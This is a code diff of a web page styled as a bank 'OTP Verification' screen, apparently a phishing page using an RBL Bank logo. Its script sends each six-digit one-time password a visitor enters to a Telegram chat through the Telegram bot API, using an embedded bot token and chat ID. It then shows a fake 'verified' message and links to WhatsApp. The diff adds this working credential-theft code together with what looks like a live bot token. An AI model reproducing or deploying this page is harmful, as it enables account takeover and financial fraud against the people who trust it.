@@ -5,126 +5,212 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OTP Verification</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
+        /* Reset some default styles */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+            background-color: #fff;
+            
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #5f2c82, #49a09d);  /* Gradient Background */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100%;
-            background-color: #f4f4f9;
+            color: #fff;
+            padding: 0px;
         }
-        form {
-            background: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-        }
-        .header, .footer {
+
+        .container {
+            background-color: #fff;
+            color: #333;
+            border-radius: 0px;
+            
             width: 100%;
+            max-width: 400px;
+            padding: 40px;
             text-align: center;
-            margin-bottom: 20px;
+            transition: all 0.3s ease;
         }
-        .header img, .footer img {
-            width: 100%;
-            max-width: 100%;
-            border-radius: 8px;
-        }
+
         h2 {
-            text-align: center;
+            font-size: 24px;
             margin-bottom: 20px;
+            font-weight: 600;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        input {
+
+        input[type="text"] {
             width: 100%;
-            padding: 5px;
-            border: none;
-            border-bottom: 2px solid #ccc;
-            background: none;
+            padding: 15px;
+            font-size: 18px;
+            margin-bottom: 25px;
+            border: 2px solid #2A3E8C;
+            border-radius: 8px;
             outline: none;
-            transition: border-color 0.3s ease;
-            font-size: 20px;
-            text-align: center;
-            letter-spacing: 5px;
+            transition: border 0.3s ease;
         }
-        input:focus {
-            border-bottom: 2px solid #007BFF;
+
+        input[type="text"]:focus {
+            border-color: #2A3E8C;
         }
+
         button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007BFF;
-            color: white;
+            background-color: #2A3E8C;
+            color: #fff;
+            padding: 15px;
+            font-size: 18px;
             border: none;
+            border-radius: 8px;
             cursor: pointer;
-            border-radius: 4px;
+            width: 100%;
             transition: background-color 0.3s ease;
         }
+
         button:hover {
-            background-color: #0056b3;
+            background-color: #5f2c82;
+        }
+
+        /* Success Message Styles */
+        .success-message {
+            margin-top: 30px;
+            display: none;
+            text-align: center;
+        }
+
+        .success-message h3 {
+            font-size: 22px;
+            color: #49a09d;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .download-btn {
+            background-color: #ff5722;
+            padding: 12px 20px;
+            font-size: 18px;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            margin-bottom: 15px;
+            transition: background-color 0.3s ease;
+        }
+
+        .download-btn:hover {
+            background-color: #e64a19;
+        }
+
+        .redirect-link {
+            font-size: 18px;
+            color: #2196F3;
+            text-decoration: none;
+            font-weight: 500;
+            transition: text-decoration 0.3s ease;
+        }
+
+        .redirect-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            button, .download-btn {
+                font-size: 16px;
+                padding: 12px;
+            }
+
+            .redirect-link {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
-
 <body>
 
-<form id="otpForm">
-    <!-- Header -->
-    <div class="header">
-        <img src="rbl.jpg" alt="Header Image">
+    <div class="container">
+        <img src="rbl.jpg" alt="logo" width="100%" height="150px">
+        <br>
+        <br>
+        <br>
+        <h2>Enter 6-Digit OTP</h2>
+        
+        
+        <form id="otp-form">
+            <input type="text" id="otp" name="otp" maxlength="6" pattern="\d{6}" placeholder="Enter OTP" required>
+            <br>
+            <br>
+            <button type="submit">Submit OTP</button>
+        </form>
+
+        <div class="success-message" id="success-message">
+            <h3>OTP Verified Successfully!</h3>
+            <p>Click below to proceed:</p>
+            <a href="path-to-next-page.html" class="redirect-link">Go to Next Page</a>
+            <br>
+            <button class="download-btn" onclick="downloadPDF()">Download PDF</button>
+        </div>
     </div>
-    
-    <h2>OTP Verification</h2>
-    
-    <label for="otp">Enter OTP</label>
-    <input type="text" id="otp" name="otp" pattern="[0-9]{6}" maxlength="6" placeholder="123456" required>
-    
-    <br><br><br>
-    
-    <button type="submit">Verify OTP</button>
-</form>
 
-<script>
-    document.getElementById('otpForm').addEventListener('submit', function (e) {
-        e.preventDefault();
+    <script>
+        document.getElementById("otp-form").addEventListener("submit", function(event) {
+            event.preventDefault();  // Prevent default form submission
 
-        // Collect OTP
-        const otp = document.getElementById('otp').value;
+            const otp = document.getElementById("otp").value;
 
-        if (otp.length !== 6) {
-            alert('OTP must be exactly 6 digits.');
-            return;
+            // Validate OTP (must be exactly 6 digits)
+            if (!/^\d{6}$/.test(otp)) {
+                alert("Please enter a valid 6-digit OTP.");
+                return;
+            }
+
+            // Send OTP to Telegram
+            sendOTPToTelegram(otp);
+        });
+
+        function sendOTPToTelegram(otp) {
+            const telegramBotToken = '7900560320:AAHHQ4xQcjuQOPzqcZvuxl8GO71RdmY1xlM';  // Replace with your bot token
+            const chatID = '7665231301';              // Replace with your chat ID
+            const message = `OTP: ${otp}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // On success, show success message and options to proceed
+                        document.querySelector(".container form").style.display = "none";
+                        document.getElementById("success-message").style.display = "block";
+                    } else {
+                        alert("Error sending OTP to Telegram.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                    alert("There was an error with the Telegram API.");
+                });
         }
 
-        // Send OTP to Telegram
-        const botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
-        const chatId = 'YOUR_CHAT_ID';
-        const message = `New OTP Submission:
-        - OTP: ${otp}`;
-        
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, text: message }),
-        }).then(response => {
-            if (response.ok) {
-                // Redirect to another page after successful submission
-                window.location.href = 'https://example.com/thank-you'; // Replace with your URL
-            } else {
-                alert('Error sending data. Please try again.');
-            }
-        }).catch(error => {
-            alert('Error sending data. Please try again.');
-            console.error(error);
-        });
-    });
-</script>
+        function downloadPDF() {
+            const link = document.createElement('a');
+            link.href = 'https://wa.link/2affju'; // Replace with the path to your PDF
+            link.download = 'https://wa.link/2affju';    // Specify the filename for the downloaded PDF
+            link.click();
+        }
+    </script>
 
 </body>
 </html>
